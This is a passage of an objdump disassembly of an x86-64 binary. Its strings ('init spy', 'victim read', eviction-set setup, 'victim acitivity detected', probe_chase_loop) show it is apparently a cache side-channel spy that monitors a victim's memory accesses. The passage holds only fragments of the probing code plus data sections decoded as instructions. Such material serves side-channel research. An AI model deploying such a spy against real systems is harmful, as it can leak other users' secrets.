    3362:	48 c1 e0 03          	shl    $0x3,%rax
    3366:	48 8d 1c 01          	lea    (%rcx,%rax,1),%rbx
    336a:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    336e:	be 01 00 00 00       	mov    $0x1,%esi
    3373:	48 89 c7             	mov    %rax,%rdi
    3376:	e8 f9 f2 ff ff       	call   2674 <probe_chase_loop>
    337b:	48 89 03             	mov    %rax,(%rbx)
    337e:	48 8d 05 8e 0e 00 00 	lea    0xe8e(%rip),%rax        # 4213 <_IO_stdin_used+0x213>
    3385:	48 89 c7             	mov    %rax,%rdi
    3388:	e8 b3 dc ff ff       	call   1040 <puts@plt>
    338d:	48 8b 05 c4 2d 00 00 	mov    0x2dc4(%rip),%rax        # 6158 <msrmts>
    3394:	48 8b 15 b5 2d 00 00 	mov    0x2db5(%rip),%rdx        # 6150 <msr_index>
    339b:	48 c1 e2 03          	shl    $0x3,%rdx
    339f:	48 83 ea 08          	sub    $0x8,%rdx
    33a3:	48 01 d0             	add    %rdx,%rax
    33a6:	48 8b 00             	mov    (%rax),%rax
    33a9:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
    33ad:	c9                   	leave
    33ae:	c3                   	ret

00000000000033af <test>:
    33af:	55                   	push   %rbp
    33b0:	48 89 e5             	mov    %rsp,%rbp
    33b3:	48 83 ec 10          	sub    $0x10,%rsp
    33b7:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    33bb:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    33bf:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    33c4:	74 07                	je     33cd <test+0x1e>
    33c6:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
    33cb:	75 07                	jne    33d4 <test+0x25>
    33cd:	b8 00 00 00 00       	mov    $0x0,%eax
    33d2:	eb 36                	jmp    340a <test+0x5b>
    33d4:	48 8d 05 3f 0e 00 00 	lea    0xe3f(%rip),%rax        # 421a <_IO_stdin_used+0x21a>
    33db:	48 89 c7             	mov    %rax,%rdi
    33de:	e8 5d dc ff ff       	call   1040 <puts@plt>
    33e3:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    33e7:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    33eb:	48 89 d6             	mov    %rdx,%rsi
    33ee:	48 89 c7             	mov    %rax,%rdi
    33f1:	e8 18 ff ff ff       	call   330e <test_intern>
    33f6:	48 8b 15 23 2d 00 00 	mov    0x2d23(%rip),%rdx        # 6120 <conf>
    33fd:	48 8b 52 18          	mov    0x18(%rdx),%rdx
    3401:	48 39 c2             	cmp    %rax,%rdx
    3404:	0f 92 c0             	setb   %al
    3407:	0f b6 c0             	movzbl %al,%eax
    340a:	c9                   	leave
    340b:	c3                   	ret

Disassembly of section .fini:

000000000000340c <_fini>:
    340c:	48 83 ec 08          	sub    $0x8,%rsp
    3410:	48 83 c4 08          	add    $0x8,%rsp
    3414:	c3                   	ret

Disassembly of section .rodata:

0000000000004000 <_IO_stdin_used>:
    4000:	01 00                	add    %eax,(%rax)
    4002:	02 00                	add    (%rax),%al
    4004:	00 00                	add    %al,(%rax)
    4006:	00 00                	add    %al,(%rax)
    4008:	5b                   	pop    %rbx
    4009:	2b 5d 20             	sub    0x20(%rbp),%ebx
    400c:	70 72                	jo     4080 <_IO_stdin_used+0x80>
    400e:	69 6e 74 69 6e 67 20 	imul   $0x20676e69,0x74(%rsi),%ebp
    4015:	61                   	(bad)
    4016:	64 72 73             	fs jb  408c <_IO_stdin_used+0x8c>
    4019:	20 6f 66             	and    %ch,0x66(%rdi)
    401c:	20 6c 69 73          	and    %ch,0x73(%rcx,%rbp,2)
    4020:	74 3a                	je     405c <_IO_stdin_used+0x5c>
    4022:	00 5b 25             	add    %bl,0x25(%rbx)
    4025:	6c                   	insb   (%dx),%es:(%rdi)
    4026:	75 5d                	jne    4085 <_IO_stdin_used+0x85>
    4028:	20 25 70 20 25 70    	and    %ah,0x70252070(%rip)        # 7025609e <_end+0x7024ff36>
    402e:	0a 00                	or     (%rax),%al
    4030:	6d                   	insl   (%dx),%es:(%rdi)
    4031:	61                   	(bad)
    4032:	64 76 69             	fs jbe 409e <_IO_stdin_used+0x9e>
    4035:	73 65                	jae    409c <_IO_stdin_used+0x9c>
    4037:	20 66 61             	and    %ah,0x61(%rsi)
    403a:	69 6c 65 64 21 00 5b 	imul   $0x2b5b0021,0x64(%rbp,%riz,2),%ebp
    4041:	2b 
    4042:	5d                   	pop    %rbp
    4043:	20 69 6e             	and    %ch,0x6e(%rcx)
    4046:	69 74 5f 65 76 73 65 	imul   $0x74657376,0x65(%rdi,%rbx,2),%esi
    404d:	74 
    404e:	20 63 6f             	and    %ah,0x6f(%rbx)
    4051:	6d                   	insl   (%dx),%es:(%rdi)
    4052:	70 6c                	jo     40c0 <_IO_stdin_used+0xc0>
    4054:	65 74 65             	gs je  40bc <_IO_stdin_used+0xbc>
    4057:	2c 20                	sub    $0x20,%al
    4059:	65 76 73             	gs jbe 40cf <_IO_stdin_used+0xcf>
    405c:	65 74 73             	gs je  40d2 <_IO_stdin_used+0xd2>
    405f:	20 25 70 2c 20 62    	and    %ah,0x62202c70(%rip)        # 62206cd5 <_end+0x62200b6d>
    4065:	75 66                	jne    40cd <_IO_stdin_used+0xcd>
    4067:	66 65 72 20          	data16 gs jb 408b <_IO_stdin_used+0x8b>
    406b:	25 70 0a 00 61       	and    $0x61000a70,%eax
    4070:	00 66 69             	add    %ah,0x69(%rsi)
    4073:	6e                   	outsb  %ds:(%rsi),(%dx)
    4074:	64 5f                	fs pop %rdi
    4076:	65 76 73             	gs jbe 40ec <_IO_stdin_used+0xec>
    4079:	65 74 3a             	gs je  40b6 <_IO_stdin_used+0xb6>
    407c:	20 72 65             	and    %dh,0x65(%rdx)
    407f:	73 65                	jae    40e6 <_IO_stdin_used+0xe6>
    4081:	74 00                	je     4083 <_IO_stdin_used+0x83>
    4083:	62                   	(bad)
    4084:	00 63 00             	add    %ah,0x0(%rbx)
    4087:	64 00 65 00          	add    %ah,%fs:0x0(%rbp)
    408b:	6d                   	insl   (%dx),%es:(%rdi)
    408c:	73 72                	jae    4100 <_IO_stdin_used+0x100>
    408e:	6d                   	insl   (%dx),%es:(%rdi)
    408f:	74 73                	je     4104 <_IO_stdin_used+0x104>
    4091:	00 74 65 73          	add    %dh,0x73(%rbp,%riz,2)
    4095:	74 00                	je     4097 <_IO_stdin_used+0x97>
    4097:	72 00                	jb     4099 <_IO_stdin_used+0x99>
    4099:	00 00                	add    %al,(%rax)
    409b:	00 00                	add    %al,(%rax)
    409d:	00 00                	add    %al,(%rax)
    409f:	00 45 72             	add    %al,0x72(%rbp)
    40a2:	72 6f                	jb     4113 <_IO_stdin_used+0x113>
    40a4:	72 20                	jb     40c6 <_IO_stdin_used+0xc6>
    40a6:	72 65                	jb     410d <_IO_stdin_used+0x10d>
    40a8:	61                   	(bad)
    40a9:	64 69 6e 67 20 61 64 	imul   $0x72646120,%fs:0x67(%rsi),%ebp
    40b0:	72 
    40b1:	65 73 73             	gs jae 4127 <_IO_stdin_used+0x127>
    40b4:	20 66 69             	and    %ah,0x69(%rsi)
    40b7:	6c                   	insb   (%dx),%es:(%rdi)
    40b8:	65 20 28             	and    %ch,%gs:(%rax)
    40bb:	66 6f                	outsw  %ds:(%rsi),(%dx)
    40bd:	70 65                	jo     4124 <_IO_stdin_used+0x124>
    40bf:	6e                   	outsb  %ds:(%rsi),(%dx)
    40c0:	29 21                	sub    %esp,(%rcx)
    40c2:	0a 00                	or     (%rax),%al
    40c4:	00 00                	add    %al,(%rax)
    40c6:	6d                   	insl   (%dx),%es:(%rdi)
    40c7:	6d                   	insl   (%dx),%es:(%rdi)
    40c8:	61                   	(bad)
    40c9:	70 20                	jo     40eb <_IO_stdin_used+0xeb>
    40cb:	76 69                	jbe    4136 <_IO_stdin_used+0x136>
    40cd:	63 74 69 6d          	movsxd 0x6d(%rcx,%rbp,2),%esi
    40d1:	20 66 61             	and    %ah,0x61(%rsi)
    40d4:	69 6c 65 64 21 00 69 	imul   $0x6e690021,0x64(%rbp,%riz,2),%ebp
    40db:	6e 
    40dc:	69 74 20 73 70 79 00 	imul   $0x76007970,0x73(%rax,%riz,1),%esi
    40e3:	76 
    40e4:	69 63 74 69 6d 20 72 	imul   $0x72206d69,0x74(%rbx),%esp
    40eb:	65 61                	gs (bad)
    40ed:	64 00 69 6e          	add    %ch,%fs:0x6e(%rcx)
    40f1:	69 74 20 65 76 73 65 	imul   $0x74657376,0x65(%rax,%riz,1),%esi
    40f8:	74 
    40f9:	20 64 6f 6e          	and    %ah,0x6e(%rdi,%rbp,2)
    40fd:	65 00 66 69          	add    %ah,%gs:0x69(%rsi)
    4101:	6e                   	outsb  %ds:(%rsi),(%dx)
    4102:	64 20 65 76          	and    %ah,%fs:0x76(%rbp)
    4106:	73 65                	jae    416d <_IO_stdin_used+0x16d>
    4108:	74 20                	je     412a <_IO_stdin_used+0x12a>
    410a:	64 6f                	outsl  %fs:(%rsi),(%dx)
    410c:	6e                   	outsb  %ds:(%rsi),(%dx)
    410d:	65 00 00             	add    %al,%gs:(%rax)
    4110:	5b                   	pop    %rbx
    4111:	2b 5d 20             	sub    0x20(%rbp),%ebx
    4114:	73 70                	jae    4186 <_IO_stdin_used+0x186>
    4116:	79 20                	jns    4138 <_IO_stdin_used+0x138>
    4118:	65 76 73             	gs jbe 418e <_IO_stdin_used+0x18e>
    411b:	65 74 20             	gs je  413e <_IO_stdin_used+0x13e>
    411e:	66 6f                	outsw  %ds:(%rsi),(%dx)
    4120:	72 20                	jb     4142 <_IO_stdin_used+0x142>
    4122:	74 61                	je     4185 <_IO_stdin_used+0x185>
    4124:	72 67                	jb     418d <_IO_stdin_used+0x18d>
    4126:	65 74 20             	gs je  4149 <_IO_stdin_used+0x149>
    4129:	61                   	(bad)
    412a:	64 72 73             	fs jb  41a0 <_IO_stdin_used+0x1a0>
    412d:	20 25 70 0a 00 00    	and    %ah,0xa70(%rip)        # 4ba3 <__GNU_EH_FRAME_HDR+0x983>
    4133:	00 00                	add    %al,(%rax)
    4135:	00 00                	add    %al,(%rax)
    4137:	00 5b 21             	add    %bl,0x21(%rbx)
    413a:	5d                   	pop    %rbp
    413b:	20 76 69             	and    %dh,0x69(%rsi)
    413e:	63 74 69 6d          	movsxd 0x6d(%rcx,%rbp,2),%esi
    4142:	20 61 63             	and    %ah,0x63(%rcx)
    4145:	69 74 69 76 69 74 79 	imul   $0x20797469,0x76(%rcx,%rbp,2),%esi
    414c:	20 
    414d:	64 65 74 65          	fs gs je 41b6 <_IO_stdin_used+0x1b6>
    4151:	63 74 65 64          	movsxd 0x64(%rbp,%riz,2),%esi
    4155:	21 00                	and    %eax,(%rax)
    4157:	00 5b 2b             	add    %bl,0x2b(%rbx)
    415a:	5d                   	pop    %rbp
    415b:	20 73 70             	and    %dh,0x70(%rbx)
    415e:	79 20                	jns    4180 <_IO_stdin_used+0x180>
    4160:	69 6e 69 74 20 63 6f 	imul   $0x6f632074,0x69(%rsi),%ebp
    4167:	6d                   	insl   (%dx),%es:(%rdi)
    4168:	70 6c                	jo     41d6 <_IO_stdin_used+0x1d6>
    416a:	65 74 65             	gs je  41d2 <_IO_stdin_used+0x1d2>
    416d:	2c 20                	sub    $0x20,%al
    416f:	6d                   	insl   (%dx),%es:(%rdi)
    4170:	6f                   	outsl  %ds:(%rsi),(%dx)
    4171:	6e                   	outsb  %ds:(%rsi),(%dx)
    4172:	69 74 6f 72 69 6e 67 	imul   $0x20676e69,0x72(%rdi,%rbp,2),%esi
    4179:	20 
    417a:	25 70 20 6e 6f       	and    $0x6f6e2070,%eax
    417f:	77 2e                	ja     41af <_IO_stdin_used+0x1af>
    4181:	2e 2e 0a 00          	cs cs or (%rax),%al
    4185:	25 70 0a 00 00       	and    $0xa70,%eax
    418a:	00 00                	add    %al,(%rax)
    418c:	00 00                	add    %al,(%rax)
    418e:	00 00                	add    %al,(%rax)
    4190:	5b                   	pop    %rbx
    4191:	2b 5d 20             	sub    0x20(%rbp),%ebx
    4194:	70 72                	jo     4208 <_IO_stdin_used+0x208>
    4196:	69 6e 74 69 6e 67 20 	imul   $0x20676e69,0x74(%rsi),%ebp
    419d:	61                   	(bad)
    419e:	64 72 73             	fs jb  4214 <_IO_stdin_used+0x214>
    41a1:	20 6f 66             	and    %ch,0x66(%rdi)
    41a4:	20 6c 69 73          	and    %ch,0x73(%rcx,%rbp,2)
    41a8:	74 3a                	je     41e4 <_IO_stdin_used+0x1e4>
    41aa:	00 5b 25             	add    %bl,0x25(%rbx)
    41ad:	6c                   	insb   (%dx),%es:(%rdi)
    41ae:	75 5d                	jne    420d <_IO_stdin_used+0x20d>
    41b0:	20 25 70 20 25 70    	and    %ah,0x70252070(%rip)        # 70256226 <_end+0x702500be>
    41b6:	0a 00                	or     (%rax),%al
    41b8:	6d                   	insl   (%dx),%es:(%rdi)
    41b9:	61                   	(bad)
    41ba:	64 76 69             	fs jbe 4226 <__GNU_EH_FRAME_HDR+0x6>
    41bd:	73 65                	jae    4224 <__GNU_EH_FRAME_HDR+0x4>
    41bf:	20 66 61             	and    %ah,0x61(%rsi)
    41c2:	69 6c 65 64 21 00 5b 	imul   $0x2b5b0021,0x64(%rbp,%riz,2),%ebp
    41c9:	2b 
    41ca:	5d                   	pop    %rbp
    41cb:	20 69 6e             	and    %ch,0x6e(%rcx)
    41ce:	69 74 5f 65 76 73 65 	imul   $0x74657376,0x65(%rdi,%rbx,2),%esi
    41d5:	74 
    41d6:	20 63 6f             	and    %ah,0x6f(%rbx)
    41d9:	6d                   	insl   (%dx),%es:(%rdi)
    41da:	70 6c                	jo     4248 <__GNU_EH_FRAME_HDR+0x28>
    41dc:	65 74 65             	gs je  4244 <__GNU_EH_FRAME_HDR+0x24>
    41df:	2c 20                	sub    $0x20,%al
    41e1:	65 76 73             	gs jbe 4257 <__GNU_EH_FRAME_HDR+0x37>
    41e4:	65 74 73             	gs je  425a <__GNU_EH_FRAME_HDR+0x3a>
    41e7:	20 25 70 2c 20 62    	and    %ah,0x62202c70(%rip)        # 62206e5d <_end+0x62200cf5>
    41ed:	75 66                	jne    4255 <__GNU_EH_FRAME_HDR+0x35>
    41ef:	66 65 72 20          	data16 gs jb 4213 <_IO_stdin_used+0x213>
    41f3:	25 70 0a 00 61       	and    $0x61000a70,%eax
    41f8:	00 66 69             	add    %ah,0x69(%rsi)
    41fb:	6e                   	outsb  %ds:(%rsi),(%dx)
    41fc:	64 5f                	fs pop %rdi
    41fe:	65 76 73             	gs jbe 4274 <__GNU_EH_FRAME_HDR+0x54>
    4201:	65 74 3a             	gs je  423e <__GNU_EH_FRAME_HDR+0x1e>
    4204:	20 72 65             	and    %dh,0x65(%rdx)
    4207:	73 65                	jae    426e <__GNU_EH_FRAME_HDR+0x4e>
    4209:	74 00                	je     420b <_IO_stdin_used+0x20b>
    420b:	62                   	(bad)
    420c:	00 63 00             	add    %ah,0x0(%rbx)
    420f:	64 00 65 00          	add    %ah,%fs:0x0(%rbp)
    4213:	6d                   	insl   (%dx),%es:(%rdi)
    4214:	73 72                	jae    4288 <__GNU_EH_FRAME_HDR+0x68>
    4216:	6d                   	insl   (%dx),%es:(%rdi)
    4217:	74 73                	je     428c <__GNU_EH_FRAME_HDR+0x6c>
    4219:	00 74 65 73          	add    %dh,0x73(%rbp,%riz,2)
    421d:	74 00                	je     421f <_IO_stdin_used+0x21f>

Disassembly of section .eh_frame_hdr:

0000000000004220 <__GNU_EH_FRAME_HDR>:
    4220:	01 1b                	add    %ebx,(%rbx)
    4222:	03 3b                	add    (%rbx),%edi
    4224:	24 02                	and    $0x2,%al
    4226:	00 00                	add    %al,(%rax)
    4228:	43 00 00             	rex.XB add %al,(%r8)
    422b:	00 00                	add    %al,(%rax)
    422d:	ce                   	(bad)
    422e:	ff                   	(bad)
    422f:	ff 70 02             	push   0x2(%rax)
    4232:	00 00                	add    %al,(%rax)
    4234:	60                   	(bad)
    4235:	cf                   	iret
    4236:	ff                   	(bad)
    4237:	ff 98 02 00 00 70    	lcall  *0x70000002(%rax)
    423d:	cf                   	iret
    423e:	ff                   	(bad)
    423f:	ff 40 02             	incl   0x2(%rax)
    4242:	00 00                	add    %al,(%rax)
    4244:	59                   	pop    %rcx
    4245:	d0 ff                	sar    %bh
    4247:	ff b0 02 00 00 9d    	push   -0x62fffffe(%rax)
    424d:	d0 ff                	sar    %bh
    424f:	ff d0                	call   *%rax
    4251:	02 00                	add    (%rax),%al
    4253:	00 2d d1 ff ff f0    	add    %ch,-0xf00002f(%rip)        # fffffffff100422a <_end+0xfffffffff0ffe0c2>
    4259:	02 00                	add    (%rax),%al
    425b:	00 3f                	add    %bh,(%rdi)
    425d:	d1 ff                	sar    %edi
    425f:	ff 10                	call   *(%rax)
    4261:	03 00                	add    (%rax),%eax
    4263:	00 51 d1             	add    %dl,-0x2f(%rcx)
    4266:	ff                   	(bad)
    4267:	ff 30                	push   (%rax)
    4269:	03 00                	add    (%rax),%eax
    426b:	00 9d d1 ff ff 54    	add    %bl,0x54ffffd1(%rbp)
    4271:	03 00                	add    (%rax),%eax
    4273:	00 ef                	add    %ch,%bh
    4275:	d1 ff                	sar    %edi
    4277:	ff                   	(bad)
    4278:	78 03                	js     427d <__GNU_EH_FRAME_HDR+0x5d>
    427a:	00 00                	add    %al,(%rax)
    427c:	3e d2 ff             	ds sar %cl,%bh
    427f:	ff 98 03 00 00 50    	lcall  *0x50000003(%rax)
    4285:	d2 ff                	sar    %cl,%bh
    4287:	ff                   	(bad)
    4288:	b8 03 00 00 91       	mov    $0x91000003,%eax
    428d:	d2 ff                	sar    %cl,%bh
    428f:	ff                   	(bad)
    4290:	d8 03                	fadds  (%rbx)
    4292:	00 00                	add    %al,(%rax)
    4294:	c7                   	(bad)
    4295:	d2 ff                	sar    %cl,%bh
    4297:	ff                   	(bad)
    4298:	f8                   	clc
    4299:	03 00                	add    (%rax),%eax
    429b:	00 2b                	add    %ch,(%rbx)
    429d:	d3 ff                	sar    %cl,%edi
    429f:	ff 18                	lcall  *(%rax)
    42a1:	04 00                	add    $0x0,%al
    42a3:	00 9d d3 ff ff 38    	add    %bl,0x38ffffd3(%rbp)
    42a9:	04 00                	add    $0x0,%al
    42ab:	00 19                	add    %bl,(%rcx)
    42ad:	d5                   	(bad)
    42ae:	ff                   	(bad)
    42af:	ff 5c 04 00          	lcall  *0x0(%rsp,%rax,1)
    42b3:	00 71 d5             	add    %dh,-0x2b(%rcx)
    42b6:	ff                   	(bad)
    42b7:	ff                   	(bad)
    42b8:	7c 04                	jl     42be <__GNU_EH_FRAME_HDR+0x9e>
    42ba:	00 00                	add    %al,(%rax)
    42bc:	2e d6                	cs (bad)
    42be:	ff                   	(bad)
    42bf:	ff 9c 04 00 00 a3 d6 	lcall  *-0x295d0000(%rsp,%rax,1)
    42c6:	ff                   	(bad)
    42c7:	ff                   	(bad)
    42c8:	bc 04 00 00 05       	mov    $0x5000004,%esp
    42cd:	d7                   	xlat   %ds:(%rbx)
    42ce:	ff                   	(bad)
    42cf:	ff                   	(bad)
    42d0:	dc 04 00             	faddl  (%rax,%rax,1)
    42d3:	00 d2                	add    %dl,%dl
    42d5:	d7                   	xlat   %ds:(%rbx)
    42d6:	ff                   	(bad)
    42d7:	ff                   	(bad)
    42d8:	fc                   	cld
    42d9:	04 00                	add    $0x0,%al
    42db:	00 f7                	add    %dh,%bh
    42dd:	d8 ff                	fdivr  %st(7),%st
    42df:	ff 1c 05 00 00 92 d9 	lcall  *-0x266e0000(,%rax,1)
    42e6:	ff                   	(bad)
    42e7:	ff                   	(bad)
    42e8:	3c 05                	cmp    $0x5,%al
    42ea:	00 00                	add    %al,(%rax)
    42ec:	a8 da                	test   $0xda,%al
    42ee:	ff                   	(bad)
    42ef:	ff 5c 05 00          	lcall  *0x0(%rbp,%rax,1)
    42f3:	00 c7                	add    %al,%bh
    42f5:	dc ff                	fdivr  %st,%st(7)
    42f7:	ff                   	(bad)
    42f8:	7c 05                	jl     42ff <__GNU_EH_FRAME_HDR+0xdf>
    42fa:	00 00                	add    %al,(%rax)
    42fc:	fc                   	cld
    42fd:	dc ff                	fdivr  %st,%st(7)
    42ff:	ff 9c 05 00 00 1c dd 	lcall  *-0x22e40000(%rbp,%rax,1)
    4306:	ff                   	(bad)
    4307:	ff                   	(bad)
    4308:	bc 05 00 00 94       	mov    $0x94000005,%esp
    430d:	dd ff                	(bad)
    430f:	ff                   	(bad)
    4310:	dc 05 00 00 eb dd    	faddl  -0x22150000(%rip)        # ffffffffddeb4316 <_end+0xffffffffddeae1ae>
    4316:	ff                   	(bad)
    4317:	ff                   	(bad)
    4318:	fc                   	cld
    4319:	05 00 00 8c de       	add    $0xde8c0000,%eax
    431e:	ff                   	(bad)
    431f:	ff 20                	jmp    *(%rax)
    4321:	06                   	(bad)
    4322:	00 00                	add    %al,(%rax)
    4324:	e9 de ff ff 40       	jmp    41004307 <_end+0x40ffe19f>
    4329:	06                   	(bad)
    432a:	00 00                	add    %al,(%rax)
    432c:	1a e0                	sbb    %al,%ah
    432e:	ff                   	(bad)
    432f:	ff 60 06             	jmp    *0x6(%rax)
    4332:	00 00                	add    %al,(%rax)
    4334:	d1 e0                	shl    %eax
    4336:	ff                   	(bad)
    4337:	ff 80 06 00 00 af    	incl   -0x50fffffa(%rax)
    433d:	e1 ff                	loope  433e <__GNU_EH_FRAME_HDR+0x11e>
    433f:	ff a0 06 00 00 fb    	jmp    *-0x4fffffa(%rax)
    4345:	e1 ff                	loope  4346 <__GNU_EH_FRAME_HDR+0x126>
    4347:	ff c0                	inc    %eax
    4349:	06                   	(bad)
    434a:	00 00                	add    %al,(%rax)
    434c:	0b e2                	or     %edx,%esp
    434e:	ff                   	(bad)
    434f:	ff e0                	jmp    *%rax
    4351:	06                   	(bad)
    4352:	00 00                	add    %al,(%rax)
    4354:	8a e2                	mov    %dl,%ah
    4356:	ff                   	(bad)
    4357:	ff 00                	incl   (%rax)
    4359:	07                   	(bad)
    435a:	00 00                	add    %al,(%rax)
    435c:	d7                   	xlat   %ds:(%rbx)
    435d:	e2 ff                	loop   435e <__GNU_EH_FRAME_HDR+0x13e>
    435f:	ff 20                	jmp    *(%rax)
    4361:	07                   	(bad)
    4362:	00 00                	add    %al,(%rax)
    4364:	5c                   	pop    %rsp
    4365:	e3 ff                	jrcxz  4366 <__GNU_EH_FRAME_HDR+0x146>
    4367:	ff 40 07             	incl   0x7(%rax)
    436a:	00 00                	add    %al,(%rax)
    436c:	a0 e3 ff ff 60 07 00 	movabs 0x3000000760ffffe3,%al
    4373:	00 30 
    4375:	e4 ff                	in     $0xff,%al
    4377:	ff 80 07 00 00 42    	incl   0x42000007(%rax)
    437d:	e4 ff                	in     $0xff,%al
    437f:	ff a0 07 00 00 54    	jmp    *0x54000007(%rax)
    4385:	e4 ff                	in     $0xff,%al
    4387:	ff c0                	inc    %eax
    4389:	07                   	(bad)
    438a:	00 00                	add    %al,(%rax)
    438c:	a0 e4 ff ff e4 07 00 	movabs 0xf2000007e4ffffe4,%al
    4393:	00 f2 
    4395:	e4 ff                	in     $0xff,%al
    4397:	ff 08                	decl   (%rax)
    4399:	08 00                	or     %al,(%rax)
    439b:	00 41 e5             	add    %al,-0x1b(%rcx)
    439e:	ff                   	(bad)
    439f:	ff 28                	ljmp   *(%rax)
    43a1:	08 00                	or     %al,(%rax)
    43a3:	00 53 e5             	add    %dl,-0x1b(%rbx)
    43a6:	ff                   	(bad)
    43a7:	ff 48 08             	decl   0x8(%rax)
    43aa:	00 00                	add    %al,(%rax)
    43ac:	94                   	xchg   %eax,%esp
    43ad:	e5 ff                	in     $0xff,%eax
    43af:	ff 68 08             	ljmp   *0x8(%rax)
    43b2:	00 00                	add    %al,(%rax)
    43b4:	ca e5 ff             	lret   $0xffe5
    43b7:	ff 88 08 00 00 2e    	decl   0x2e000008(%rax)
    43bd:	e6 ff                	out    %al,$0xff
    43bf:	ff a8 08 00 00 a0    	ljmp   *-0x5ffffff8(%rax)
    43c5:	e6 ff                	out    %al,$0xff
    43c7:	ff c8                	dec    %eax
    43c9:	08 00                	or     %al,(%rax)
    43cb:	00 1c e8             	add    %bl,(%rax,%rbp,8)
    43ce:	ff                   	(bad)
    43cf:	ff                   	(bad)
    43d0:	ec                   	in     (%dx),%al
    43d1:	08 00                	or     %al,(%rax)
    43d3:	00 74 e8 ff          	add    %dh,-0x1(%rax,%rbp,8)
    43d7:	ff 0c 09             	decl   (%rcx,%rcx,1)
    43da:	00 00                	add    %al,(%rax)
    43dc:	31 e9                	xor    %ebp,%ecx
    43de:	ff                   	(bad)
    43df:	ff 2c 09             	ljmp   *(%rcx,%rcx,1)
    43e2:	00 00                	add    %al,(%rax)
    43e4:	a6                   	cmpsb  %es:(%rdi),%ds:(%rsi)
    43e5:	e9 ff ff 4c 09       	jmp    94d43e9 <_end+0x94ce281>
    43ea:	00 00                	add    %al,(%rax)
    43ec:	08 ea                	or     %ch,%dl
    43ee:	ff                   	(bad)
    43ef:	ff 6c 09 00          	ljmp   *0x0(%rcx,%rcx,1)
    43f3:	00 d5                	add    %dl,%ch
    43f5:	ea                   	(bad)
    43f6:	ff                   	(bad)
    43f7:	ff 8c 09 00 00 fa eb 	decl   -0x14060000(%rcx,%rcx,1)
    43fe:	ff                   	(bad)
    43ff:	ff ac 09 00 00 95 ec 	ljmp   *-0x136b0000(%rcx,%rcx,1)
    4406:	ff                   	(bad)
    4407:	ff cc                	dec    %esp
    4409:	09 00                	or     %eax,(%rax)
    440b:	00 ab ed ff ff ec    	add    %ch,-0x13000013(%rbx)
    4411:	09 00                	or     %eax,(%rax)
    4413:	00 ca                	add    %cl,%dl
    4415:	ef                   	out    %eax,(%dx)
    4416:	ff                   	(bad)
    4417:	ff 0c 0a             	decl   (%rdx,%rcx,1)
    441a:	00 00                	add    %al,(%rax)
    441c:	ff                   	(bad)
    441d:	ef                   	out    %eax,(%dx)
    441e:	ff                   	(bad)
    441f:	ff 2c 0a             	ljmp   *(%rdx,%rcx,1)
    4422:	00 00                	add    %al,(%rax)
    4424:	1f                   	(bad)
    4425:	f0 ff                	lock (bad)
    4427:	ff 4c 0a 00          	decl   0x0(%rdx,%rcx,1)
    442b:	00 97 f0 ff ff 6c    	add    %dl,0x6cfffff0(%rdi)
    4431:	0a 00                	or     (%rax),%al
    4433:	00 ee                	add    %ch,%dh
    4435:	f0 ff                	lock (bad)
    4437:	ff 8c 0a 00 00 8f f1 	decl   -0xe710000(%rdx,%rcx,1)
    443e:	ff                   	(bad)
    443f:	ff                   	.byte 0xff
    4440:	b0 0a                	mov    $0xa,%al
	...

Disassembly of section .eh_frame:

0000000000004448 <__FRAME_END__-0x8a8>:
    4448:	14 00                	adc    $0x0,%al
    444a:	00 00                	add    %al,(%rax)
    444c:	00 00                	add    %al,(%rax)
    444e:	00 00                	add    %al,(%rax)
    4450:	01 7a 52             	add    %edi,0x52(%rdx)
    4453:	00 01                	add    %al,(%rcx)
    4455:	78 10                	js     4467 <__GNU_EH_FRAME_HDR+0x247>
    4457:	01 1b                	add    %ebx,(%rbx)
    4459:	0c 07                	or     $0x7,%al
    445b:	08 90 01 07 10 14    	or     %dl,0x14100701(%rax)
    4461:	00 00                	add    %al,(%rax)
    4463:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4466:	00 00                	add    %al,(%rax)
    4468:	28 cd                	sub    %cl,%ch
    446a:	ff                   	(bad)
    446b:	ff 22                	jmp    *(%rdx)
	...
    4475:	00 00                	add    %al,(%rax)
    4477:	00 14 00             	add    %dl,(%rax,%rax,1)
    447a:	00 00                	add    %al,(%rax)
    447c:	00 00                	add    %al,(%rax)
    447e:	00 00                	add    %al,(%rax)
    4480:	01 7a 52             	add    %edi,0x52(%rdx)
    4483:	00 01                	add    %al,(%rcx)
    4485:	78 10                	js     4497 <__GNU_EH_FRAME_HDR+0x277>
    4487:	01 1b                	add    %ebx,(%rbx)
    4489:	0c 07                	or     $0x7,%al
    448b:	08 90 01 00 00 24    	or     %dl,0x24000001(%rax)
    4491:	00 00                	add    %al,(%rax)
    4493:	00 1c 00             	add    %bl,(%rax,%rax,1)
    4496:	00 00                	add    %al,(%rax)
    4498:	88 cb                	mov    %cl,%bl
    449a:	ff                   	(bad)
    449b:	ff 60 01             	jmp    *0x1(%rax)
    449e:	00 00                	add    %al,(%rax)
    44a0:	00 0e                	add    %cl,(%rsi)
    44a2:	10 46 0e             	adc    %al,0xe(%rsi)
    44a5:	18 4a 0f             	sbb    %cl,0xf(%rdx)
    44a8:	0b 77 08             	or     0x8(%rdi),%esi
    44ab:	80 00 3f             	addb   $0x3f,(%rax)
    44ae:	1a 3b                	sbb    (%rbx),%bh
    44b0:	2a 33                	sub    (%rbx),%dh
    44b2:	24 22                	and    $0x22,%al
    44b4:	00 00                	add    %al,(%rax)
    44b6:	00 00                	add    %al,(%rax)
    44b8:	14 00                	adc    $0x0,%al
    44ba:	00 00                	add    %al,(%rax)
    44bc:	44 00 00             	add    %r8b,(%rax)
    44bf:	00 c0                	add    %al,%al
    44c1:	cc                   	int3
    44c2:	ff                   	(bad)
    44c3:	ff 08                	decl   (%rax)
	...
    44cd:	00 00                	add    %al,(%rax)
    44cf:	00 1c 00             	add    %bl,(%rax,%rax,1)
    44d2:	00 00                	add    %al,(%rax)
    44d4:	5c                   	pop    %rsp
    44d5:	00 00                	add    %al,(%rax)
    44d7:	00 a1 cd ff ff 44    	add    %ah,0x44ffffcd(%rcx)
    44dd:	00 00                	add    %al,(%rax)
    44df:	00 00                	add    %al,(%rax)
    44e1:	41 0e                	rex.B (bad)
